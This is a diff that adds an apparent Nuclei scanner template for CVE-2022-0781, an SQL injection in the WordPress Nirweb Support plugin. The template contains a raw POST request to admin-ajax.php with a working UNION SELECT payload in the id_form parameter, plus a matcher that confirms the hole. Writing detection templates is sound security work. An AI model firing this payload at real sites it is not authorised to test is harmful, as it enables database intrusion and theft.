@@ -1,0 +1,32 @@
+id: CVE-2022-0781
+info:
+  name: WordPress Nirweb Support Plugin SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    WordPress plugin Nirweb support versions before 2.8.2 are vulnerable to SQL Injection via the `id_form` parameter in the `admin-ajax.php` file.
+  reference:
+    - https://wpscan.com/vulnerability/1a8f9c7b-a422-4f45-a516-c3c14eb05161
+    - https://wpscan.com/plugin/nirweb-support
+  classification:
+    cve-id: CVE-2022-0781
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  tags: sql-injection,wordpress
+http:
+  - raw:
+      - |
+        POST /wp-admin/admin-ajax.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        action=answerd_ticket&id_form=1 UNION ALL SELECT NULL,NULL,md5(123),NULL,NULL,NULL,NULL,NULL-- -
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "202cb962ac59075b964b07152d234b70"
+        part: body
